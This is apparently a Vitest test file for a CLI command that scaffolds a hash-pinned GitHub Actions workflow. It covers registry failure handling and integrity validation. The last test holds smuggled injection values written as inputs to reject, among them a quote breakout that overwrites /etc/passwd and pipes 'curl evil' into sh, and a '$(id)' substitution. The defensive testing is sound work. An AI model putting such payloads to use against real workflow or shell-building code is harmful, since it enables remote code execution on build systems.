import { readFileSync } from "node:fs";
import { readFile, stat, writeFile } from "node:fs/promises";
import path from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import { parseCiProvider, scaffoldCiWorkflow } from "../src/trust-ci";
import { cleanupTempDirs, createTempDir, mkdirp, projectRoot } from "./cli-e2e-helpers";

const packageVersion = (
  JSON.parse(readFileSync(path.join(projectRoot, "package.json"), "utf8")) as {
    version: string;
  }
).version;

afterAll(async () => {
  await cleanupTempDirs();
});

const WORKFLOW_PATH = path.join(".github", "workflows", "safeinstall-trust.yml");

// A deterministic 64-byte digest standing in for the registry's dist.integrity.
const STUB_DIGEST = Buffer.alloc(64, 7);
const STUB_INTEGRITY = `sha512-${STUB_DIGEST.toString("base64")}`;
const STUB_HEX = STUB_DIGEST.toString("hex");
const STUB_TARBALL = `https://registry.npmjs.org/safeinstall-cli/-/safeinstall-cli-${packageVersion}.tgz`;

/**
 * Stub registry for the scaffold's TOFU fetch. Serves a version-manifest with
 * the given dist fields and records every requested URL, so tests can assert
 * both what was embedded and that the "exists" path stays off the network.
 */
function stubRegistry(dist: Record<string, unknown> | undefined = { tarball: STUB_TARBALL, integrity: STUB_INTEGRITY }): {
  fetchImpl: typeof fetch;
  calls: string[];
} {
  const calls: string[] = [];
  const fetchImpl: typeof fetch = (input) => {
    calls.push(String(input));
    return Promise.resolve(new Response(JSON.stringify({ dist }), { status: 200 }));
  };
  return { fetchImpl, calls };
}

async function workflowExists(root: string): Promise<boolean> {
  return stat(path.join(root, WORKFLOW_PATH)).then(
    () => true,
    () => false
  );
}

describe("parseCiProvider", () => {
  it("parses --ci github in both forms", () => {
    expect(parseCiProvider(["--ci", "github"])).toBe("github");
    expect(parseCiProvider(["--ci=github"])).toBe("github");
  });

  it("returns undefined when absent", () => {
    expect(parseCiProvider(["--mode", "strict"])).toBeUndefined();
  });

  it("rejects unsupported providers", () => {
    expect(parseCiProvider(["--ci", "gitlab"])).toBeInstanceOf(Error);
    expect(parseCiProvider(["--ci"])).toBeInstanceOf(Error);
  });
});

describe("scaffoldCiWorkflow", () => {
  it("writes a trust-only workflow that pins the CLI by version and content hash", async () => {
    const root = await createTempDir("safeinstall-ci-");
    const registry = stubRegistry();
    const result = await scaffoldCiWorkflow(root, "github", { fetchImpl: registry.fetchImpl });

    expect(result.status).toBe("created");
    expect(result.pinnedVersion).toBe(packageVersion);
    expect(result.pinnedSha512Hex).toBe(STUB_HEX);
    // The TOFU fetch asked the registry for exactly the pinned version manifest.
    expect(registry.calls).toEqual([`https://registry.npmjs.org/safeinstall-cli/${packageVersion}`]);

    const content = await readFile(path.join(root, WORKFLOW_PATH), "utf8");
    // Trust-only: the CLI's own trust command, not the full dependency check
    // (which would fail on a repo without package.json).
    expect(content).toContain("safeinstall trust status --require-lock");
    // Exact version pin — never @latest, which could predate the trust command
    // and turn the anchor into a silent no-op.
    expect(content).toContain(`safeinstall-cli@${packageVersion}`);
    expect(content).not.toContain("@latest");
    // Content-hash pin (RFC-001 §13, K1(b)): the tarball is downloaded,
    // checked against the scaffold-time sha512, and installed from the local
    // file — never `npm install -g safeinstall-cli@<version>`, which would
    // trust the registry to serve the same bytes forever.
    expect(content).toContain(`curl -fsSL "${STUB_TARBALL}"`);
    expect(content).toContain(`${STUB_HEX}  /tmp/safeinstall-cli-${packageVersion}.tgz`);
    expect(content).toContain("| sha512sum -c -");
    expect(content).toContain(`npm install -g /tmp/safeinstall-cli-${packageVersion}.tgz`);
    expect(content).not.toMatch(/npm install -g safeinstall-cli@/);
    // Least privilege.
    expect(content).toContain("permissions:");
    expect(content).toContain("contents: read");
    // The verifier definition comes from the protected base branch. Candidate
    // files are checked out without credentials and are never executed.
    expect(content).toContain("pull_request_target:");
    expect(content).toContain("trust-base:");
    expect(content).toContain("persist-credentials: false");
    expect(content).toContain("working-directory: candidate");
    expect(content).not.toMatch(/^ {2}pull_request:\s*$/m);
    // Every third-party action is immutable, not a moving major tag.
    expect(content).not.toContain("actions/checkout@v4");
    expect(content).not.toContain("actions/setup-node@v4");
  });

  it("emits a workflow pinned to the exact running version, never @latest (no silent no-op)", async () => {
    // Regression guard for the release-sequencing bug: the emitted workflow must
    // install the exact running CLI version (which by construction has `trust`),
    // never a floating pin that could resolve to a CLI predating the command.
    // Asserts on the workflow CONTENT — a revert of the pin to `@latest` fails here.
    const root = await createTempDir("safeinstall-ci-pin-");
    const registry = stubRegistry();
    const result = await scaffoldCiWorkflow(root, "github", { fetchImpl: registry.fetchImpl });
    const content = await readFile(path.join(root, WORKFLOW_PATH), "utf8");
    expect(content).toContain(`safeinstall-cli@${packageVersion}`);
    expect(content).not.toContain("@latest");
    expect(result.pinnedVersion).toBe(packageVersion);
    expect(packageVersion).not.toBe("0.9.0"); // 0.9.0 predates `trust`
  });

  it("records the TOFU integrity from an overridden registry URL", async () => {
    const root = await createTempDir("safeinstall-ci-registry-");
    const registry = stubRegistry();
    await scaffoldCiWorkflow(root, "github", {
      fetchImpl: registry.fetchImpl,
      registryUrl: "https://registry.example.test/npm/"
    });
    // Trailing slashes are normalized, mirroring RegistryClient.
    expect(registry.calls).toEqual([`https://registry.example.test/npm/safeinstall-cli/${packageVersion}`]);
  });

  it("never overwrites an existing workflow, and never touches the network for one", async () => {
    const root = await createTempDir("safeinstall-ci-exists-");
    await mkdirp(path.join(root, ".github", "workflows"));
    await writeFile(path.join(root, WORKFLOW_PATH), "name: my custom workflow\n");

    const registry = stubRegistry();
    const result = await scaffoldCiWorkflow(root, "github", { fetchImpl: registry.fetchImpl });
    expect(result.status).toBe("exists");
    expect(result.pinnedSha512Hex).toBeUndefined();
    // The idempotent re-run must not depend on (or wait for) the registry.
    expect(registry.calls).toEqual([]);
    expect(await readFile(path.join(root, WORKFLOW_PATH), "utf8")).toBe("name: my custom workflow\n");
  });

  describe("fails closed on registry errors (no weaker, version-only fallback)", () => {
    it("rejects and writes nothing when the registry is unreachable", async () => {
      const root = await createTempDir("safeinstall-ci-net-err-");
      const fetchImpl: typeof fetch = () => Promise.reject(new Error("getaddrinfo ENOTFOUND registry.npmjs.org"));
      await expect(scaffoldCiWorkflow(root, "github", { fetchImpl })).rejects.toThrow(/ENOTFOUND/);
      expect(await workflowExists(root)).toBe(false);
    });

    it("rejects and writes nothing on a non-OK registry response", async () => {
      const root = await createTempDir("safeinstall-ci-http-err-");
      const fetchImpl: typeof fetch = () => Promise.resolve(new Response("nope", { status: 503 }));
      await expect(scaffoldCiWorkflow(root, "github", { fetchImpl })).rejects.toThrow(
        /Registry error: could not fetch safeinstall-cli@.*\(503\)/
      );
      expect(await workflowExists(root)).toBe(false);
    });

    it("rejects and writes nothing on an invalid JSON manifest", async () => {
      const root = await createTempDir("safeinstall-ci-json-err-");
      const fetchImpl: typeof fetch = () => Promise.resolve(new Response("<html>gateway</html>", { status: 200 }));
      await expect(scaffoldCiWorkflow(root, "github", { fetchImpl })).rejects.toThrow(/invalid JSON manifest/);
      expect(await workflowExists(root)).toBe(false);
    });

    it("rejects and writes nothing when the manifest has no dist.integrity", async () => {
      const root = await createTempDir("safeinstall-ci-no-integrity-");
      const registry = stubRegistry({ tarball: STUB_TARBALL });
      await expect(scaffoldCiWorkflow(root, "github", { fetchImpl: registry.fetchImpl })).rejects.toThrow(
        /no dist\.integrity/
      );
      expect(await workflowExists(root)).toBe(false);
    });

    it("rejects an integrity that is not a valid sha512 SRI", async () => {
      for (const integrity of [
        "sha1-2jmj7l5rSw0yVb/vlWAYkK/YBwk=", // wrong algorithm
        "sha512-dG9vc2hvcnQ=", // decodes to fewer than 64 bytes
        "sha512-!!!not-base64!!!"
      ]) {
        const root = await createTempDir("safeinstall-ci-bad-sri-");
        const registry = stubRegistry({ tarball: STUB_TARBALL, integrity });
        await expect(scaffoldCiWorkflow(root, "github", { fetchImpl: registry.fetchImpl })).rejects.toThrow(
          /not a valid sha512 SRI/
        );
        expect(await workflowExists(root)).toBe(false);
      }
    });

    it("rejects a tarball URL that could break out of the workflow's shell quoting", async () => {
      for (const tarball of [
        undefined,
        "http://registry.npmjs.org/safeinstall-cli/-/safeinstall-cli-1.0.0.tgz", // plaintext
        `https://registry.npmjs.org/x.tgz" -o /etc/passwd; curl evil | sh; ".tgz`, // quote breakout
        "https://registry.npmjs.org/$(id).tgz", // command substitution
        "https://registry.npmjs.org/x.zip" // not a tarball
      ]) {
        const root = await createTempDir("safeinstall-ci-bad-url-");
        const registry = stubRegistry({ tarball, integrity: STUB_INTEGRITY });
        await expect(scaffoldCiWorkflow(root, "github", { fetchImpl: registry.fetchImpl })).rejects.toThrow(
          /no https \.tgz tarball URL safe to embed/
        );
        expect(await workflowExists(root)).toBe(false);
      }
    });
  });
});
